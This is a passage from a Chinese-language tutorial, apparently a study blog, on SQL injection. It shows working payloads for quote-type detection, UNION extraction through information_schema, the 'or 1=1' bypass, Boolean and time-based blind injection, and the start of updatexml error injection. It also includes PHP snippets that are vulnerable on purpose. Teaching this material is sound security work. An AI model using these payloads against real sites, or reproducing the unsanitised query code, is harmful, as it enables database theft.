1&#x27;</span>是一个合法字符串，在查询时会先被强制类型转换为数字，不会报错<br></code></pre></td></tr></table></figure><p><code>1&#39;</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> uders <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">// 因为这里的&#x27;</span>没有闭合，会报错<br></code></pre></td></tr></table></figure><p><code>&#39;1&#39;&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">// &#x27;</span>与前面的<span class="hljs-string">&#x27;闭合了,但是剩了一个 &#x27;</span>，会报错<br></code></pre></td></tr></table></figure><h3 id="报错信息判断"><a href="#报错信息判断" class="headerlink" title="报错信息判断"></a>报错信息判断</h3><p><code>1&quot;</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">执行：id = <span class="hljs-string">&quot;1&quot;</span><span class="hljs-comment">&quot;</span><br>报错：near <span class="hljs-string">&#x27;&quot;1&quot;&quot;&#x27;</span> at <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br>//去掉外层 SQL 的单引号，留下 <span class="hljs-string">&quot;1&quot;</span><span class="hljs-comment">&quot;,可以判断出是双引号的字符型注入</span><br></code></pre></td></tr></table></figure><p><img src="/SQL1.png"></p><p><code>1&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行：<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">报错：near &#x27;</span>1<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; at line 1</span><br><span class="hljs-string">// 去掉外层留下 &#x27;</span>1<span class="hljs-string">&#x27;&#x27;</span>,再除去注入的 1<span class="hljs-string">&#x27;,可以判断出是单引号的字符型注入</span><br></code></pre></td></tr></table></figure><p><img src="/SQL2.png"></p><p><code>&#39;1</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">执行：<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;&#x27;</span>1<span class="hljs-string">&#x27;</span><br><span class="hljs-string">报错：near &#x27;</span><span class="hljs-string">&#x27;1&#x27;</span> at line 1<br>// 对于 SQL,<span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;&#x27;</span>已经闭合，所以 1<span class="hljs-string">&#x27; 成为了报错点</span><br></code></pre></td></tr></table></figure><p><img src="/SQL3.png"></p><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select username from users where id=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>根据用户输入 id，查询用户信息。用户的输入 id 字段，没有任何过滤地被直接拼接在了 sql 查询语句中。由于 id 没有被引用包裹，而且类型为数字，此为数字型注入。</p><p>可以使用在语句中加入运算符来测试这种注入是否存在</p><p>sql 关键字 <strong>union</strong>，将两个 select 语句结果合并到一个结果集中，但要求两个 select 语句拥有相同的列数。</p><p>使用联合查询 <code>union</code> 基于 <code>information_schema</code> 拿到数据库名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure><p><img src="/SQL4.png"></p><p>以把 1 换成其他的，比如 <code>database()</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata;<br></code></pre></td></tr></table></figure><p><img src="/SQL5.png"></p><p><strong>空格的 url 编码是 %20</strong>，如果要查询其他行，还需要使用 **limit **关键字。</p><p>使用联合查询去得到数据库的表名，先获取当前库（<code>database()</code>）</p><p>基于 <code>UNION</code> <code>GROUP_CONCAT(table_name)</code> 和 <code>information_schema.tables</code> 查询</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure><p><img src="/SQL6.png"></p><p>获取 表 的对应字段名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>();<br></code></pre></td></tr></table></figure><p><img src="/SQL7.png"></p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select id from users where username=&#x27;&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>通过 username 查询 id，而且用户输入的 username 被单引号包裹起来了。所有用户的所有输入都会被当成字符串处理，无法将之前的数字型注入的 payload 进行注入了。如果输入中有一个引号，就可以将前面的引号闭合，使得后面的内容从字符串中逃逸出来。最后将后面的引号注释掉。</p><p><strong>首先就需要构造单引号的闭合</strong></p><p>使用一个单引号将字符串闭合，在输入 sql 语句，最后用 # 号将后面的单引号注释掉。</p><p>比如：<strong>username &#x3D; ‘or 1&#x3D;1 #</strong>,</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select id <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;&#x27;</span>or <span class="hljs-attribute">1</span>=1 #;<br></code></pre></td></tr></table></figure><p>在 where 语句中，or 连接两个表达式，第一个返回假第二个返回真，or 操作后返回真，整个操作返回所有的结果集。</p><p><code>username=-1’ or ‘1’=‘1’ --</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> -- <span class="hljs-string">&#x27; and password = &#x27;</span>$<span class="hljs-keyword">password</span><span class="hljs-string">&#x27;;</span><br></code></pre></td></tr></table></figure><p>这样就直接可以使 <code>where</code> 条件为<strong>永真</strong>，直接输出 <code>select * from user</code> 的所有内容</p><p><img src="/SQL8.png"></p><p><code>order by</code> 判断函数</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;//报错</span><br></code></pre></td></tr></table></figure><p><img src="/SQL9.png"></p><p>库名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.schemata;<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/SQL10.png"></p><p>表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/SQL11.png"></p><p>字段名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">-- &#x27; and password = &#x27;$password&#x27;;</span><br></code></pre></td></tr></table></figure><p><img src="/SQL12.png"></p><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>顾名思义就是服务器不显示查询结果，只返回是否查询成功时，无法使用 union 直接回显数据，需要盲注。盲注有时间盲注和布尔盲注。</p><p>例句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">SELECT</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id = <span class="hljs-string">&quot;.$_GET[&quot;</span>id<span class="hljs-string">&quot;];</span><br></code></pre></td></tr></table></figure><p>有时候防火墙拦截过滤了 and 但 or 可能没有被过滤拦截，那就可以用 or 来进行盲注</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>比如 id 传参是</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>执行语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p><img src="/SQL13.png"></p><p>这里要求两个条件为真，一是有 <code>id=1</code>，二是 <code>1=1</code>。</p><p>如果 输入<code>1=2</code>，并不会有回显，返回为空，因为 <code>and</code> 后面的条件并不满足。</p><p>所以可以利用此特点来获取其他信息：</p><h3 id="length-获取长度信息"><a href="#length-获取长度信息" class="headerlink" title="length()获取长度信息"></a><strong><code>length()</code>获取长度信息</strong></h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username) <span class="hljs-operator">=</span> num<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>利用 <code>length()</code> 函数爆破数据长度</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username，<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">length</span>(username) =<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>还可以使用二分</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username)&lt; num<br><span class="hljs-attribute">id</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span> and length(username)&gt; num<br></code></pre></td></tr></table></figure><h3 id="SUBSTR-函数截取字符串"><a href="#SUBSTR-函数截取字符串" class="headerlink" title="SUBSTR()函数截取字符串"></a><strong><code>SUBSTR()</code>函数截取字符串</strong></h3><p><code>substr(string,start,length)</code> 参数依次为：要截取字符串，截取开始位置，截取长度。</p><p>比如注入 admin 的 password，构造这样的输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=&#x27;or substr(password,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;<span class="hljs-number">1</span>&#x27; #;<br></code></pre></td></tr></table></figure><p>实际 sql 语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> <span class="hljs-built_in">id</span> from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> username=<span class="hljs-string">&#x27;&#x27;</span> or substr(password,1,1)=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-comment">#;</span><br></code></pre></td></tr></table></figure><p>可以不断改变比较的字符，选取所有可显示字符去遍历，当猜中真正的返回值时，服务器返回用户存在。</p><p>除了截取字符串，还能替换某个字符</p><p>将<code>admin</code> 的第 4 到 6 个字符替换为 ***</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> username = <span class="hljs-built_in">substr</span>(username,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)||<span class="hljs-string">&#x27;***&#x27;</span>||<span class="hljs-built_in">substr</span>(username,<span class="hljs-number">7</span>) <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span>;<br></code></pre></td></tr></table></figure><p>在不使用联合注入和回显的方式拿到数据</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;a&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="MID-函数截取字符串"><a href="#MID-函数截取字符串" class="headerlink" title="MID()函数截取字符串"></a><strong><code>MID()</code>函数截取字符串</strong></h3><p>与 <code>substr()</code>比较像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mid</span>(<span class="hljs-string">&quot;butt3rf1y&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);// 返回 “but”<br><span class="hljs-attribute">substr</span>(<span class="hljs-string">&quot;butt3rf1y&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);// <span class="hljs-string">&quot;but&quot;</span><br></code></pre></td></tr></table></figure><h3 id="CONCAT-函数拼接字符串"><a href="#CONCAT-函数拼接字符串" class="headerlink" title="CONCAT()函数拼接字符串"></a><strong><code>CONCAT()</code>函数拼接字符串</strong></h3><p>可以减少查询跳转次数</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">concat</span>(<span class="hljs-params">string1,string2,...</span>)</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> concat(username,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-keyword">password</span>),<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br></code></pre></td></tr></table></figure><p><img src="/SQL14.png"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>利用语句执行时间判断真假</p><h3 id="IF-函数"><a href="#IF-函数" class="headerlink" title="IF() 函数"></a><code>IF()</code> 函数</h3><p>判断指定条件是否成立，根据结果返回不同的值</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">if</span><span class="hljs-params">(condition,value_if_true,value_if_false)</span>;<br><br><span class="hljs-string">//</span> <span class="hljs-literal">true</span>:条件成立时要返回的值<br><span class="hljs-string">//</span> <span class="hljs-literal">false</span>:条件不成立时要返回的值<br></code></pre></td></tr></table></figure><h3 id="SLEEP-函数"><a href="#SLEEP-函数" class="headerlink" title="SLEEP()函数"></a><code>SLEEP()</code>函数</h3><p>程序执行时，会暂停指定秒数</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>(<span class="hljs-variable">seconds</span>)</span><br></code></pre></td></tr></table></figure><p>比如</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">if</span>(<span class="hljs-params">sleep(<span class="hljs-number">5</span></span>),1,0)</span>;<br><br><span class="hljs-comment">//如果不存在用户名为 admin 的用户，语句将立即返回结果，否则暂停 5s 再返回结果</span><br></code></pre></td></tr></table></figure><p>延时函数 <code>SLEEP()</code> 或 <code>BENCHMARK()</code> 函数来判断是否注入成功</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ASCII(substr(username),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br><br>// 如果用户表中的第一个用户名字符为字母 a，则程序会暂停 <span class="hljs-number">5</span>s,否则返回 <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="BENCHMARK-函数"><a href="#BENCHMARK-函数" class="headerlink" title="BENCHMARK()函数"></a><code>BENCHMARK()</code>函数</h3><p>用于重复执行指定语句</p><p>（重复执行次数，重复执行语句）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">benchmark</span><span class="hljs-params">(count,expr)</span></span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(benchmark(<span class="hljs-number">10</span>,md5(<span class="hljs-string">&#x27;butt3rf1y&#x27;</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br><br>// 如果数据库中不存在用户名为 <span class="hljs-keyword">admin</span> 的用户，那么该语句将会立即返回；否则，程序将会重复执行 md5(<span class="hljs-string">&#x27;butt3rf1y&#x27;</span>) 函数 <span class="hljs-number">10</span> 次后再返回结果<br></code></pre></td></tr></table></figure><h3 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h3><p><strong><code>unix_timestamp()</code> 函数</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> user <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">if</span>(<span class="hljs-params">unix_timestamp</span>)&gt;1382772838,<span class="hljs-title">sleep</span>(<span class="hljs-params"><span class="hljs-number">5</span></span>),0)</span>;<br><br><span class="hljs-comment">//如果当前时间戳大于 1382772838,则程序会暂停 5s,否则返回 0</span><br></code></pre></td></tr></table></figure><h3 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h3><p>利用函数返回值判断是否注入成功</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">length</span>(username)=<span class="hljs-number">4</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>通过报错获取信息</p><h2 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a><code>updatexml()</code>函数</h2><p>用于更新 xml 格式数据</p><p>（要更新的 xml 数据，要更新的节点路径，更新的节点值）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span 